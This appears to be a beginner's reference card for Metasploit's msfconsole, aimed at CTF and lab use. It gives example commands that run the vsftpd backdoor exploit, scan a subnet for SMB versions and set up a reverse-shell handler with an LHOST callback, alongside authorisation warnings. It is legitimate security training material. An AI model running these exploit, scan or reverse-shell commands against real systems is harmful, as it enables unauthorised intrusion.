name: msfconsole
plain: `msfconsole` opens Metasploit, a big toolbox of exploits, scanners and payloads that you drive with short commands inside its own prompt.

The routine is: search for a module, use it, show options, set what is missing (the target RHOSTS and your own address LHOST), then run. Modules are of kinds: exploit, auxiliary (scanners and checks), payload (what runs after), post (after you are in) and encoder.
Only use it in labs and authorised tests. In CyberSci-type events you may be restricted from some features, so read the rules.
when: Check whether a lab target is vulnerable to a known exploit.
Run scanners (auxiliary modules) such as SMB version or login checks.
Catch a connection from a payload (a handler).
Keep notes of hosts and services in its database.

examples.title: Start the console quietly
examples.explain: -q hides the banner so it starts faster.

examples.title: Search for a module
examples.explain: You can search by name, CVE (cve:2021-41773), platform, type or rank. Results are numbered.

examples.title: Use a module and read its options
examples.cmd:
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > show options
examples.explain: use selects it (or use 0 for result number). show options lists what you must set: those marked required yes with no value.

examples.title: Set the target and run
examples.cmd:
msf6 exploit(...) > set RHOSTS 10.10.10.5
msf6 exploit(...) > run
examples.explain: RHOSTS is the remote target, LHOST the address the target should call back to. run (or exploit) starts it.

examples.title: Check before you fire
examples.explain: Some modules can test whether the target is vulnerable without exploiting.

examples.title: Run a scanner
examples.cmd:
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(...) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(...) > run
examples.explain: Auxiliary modules scan or probe without exploiting.

examples.title: Catch a reverse connection
examples.cmd:
msf6 > use exploit/multi/handler
msf6 exploit(...) > set payload linux/x64/shell_reverse_tcp
msf6 exploit(...) > set LHOST 10.10.14.2
msf6 exploit(...) > run
examples.explain: The handler waits for a payload on the target to call back to your machine.

examples.title: Run a resource script
examples.explain: -r runs the commands in a file as if you typed them, so a setup is repeatable.

examples.title: Save work in the database
examples.cmd:
msf6 > workspace -a ctf1
msf6 > db_nmap -sV 10.10.10.5
msf6 > services
examples.explain: workspace keeps results apart; db_nmap runs nmap and stores hosts and services, which services lists.

options.flag: hosts / services / vulns / creds / loot / notes

options.plain: Run nmap and save to the database.
Log console output to a file.

mistakes: Setting LHOST to the wrong address (the VPN interface is usually tun0, not eth0): the target cannot call back.
Skipping show options and missing a required value.
Choosing an incompatible payload: use show payloads for the module.
Using Metasploit when the event rules forbid it or when a manual exploit is simpler and quieter.
Running modules against targets you are not authorised to test.
try: Search for vsftpd, read info, set RHOSTS on a lab machine and run it.
Run the smb_version scanner against your lab subnet.
Create a workspace and run db_nmap, then list services.
Write a resource file that sets RHOSTS and LHOST and run it with -r.
see_also: searchsploit(1), nmap(1), msfvenom(1), nc(1), and the Metasploit documentation.
captured_with: Examples are written to explain a technique; they are not captured output.
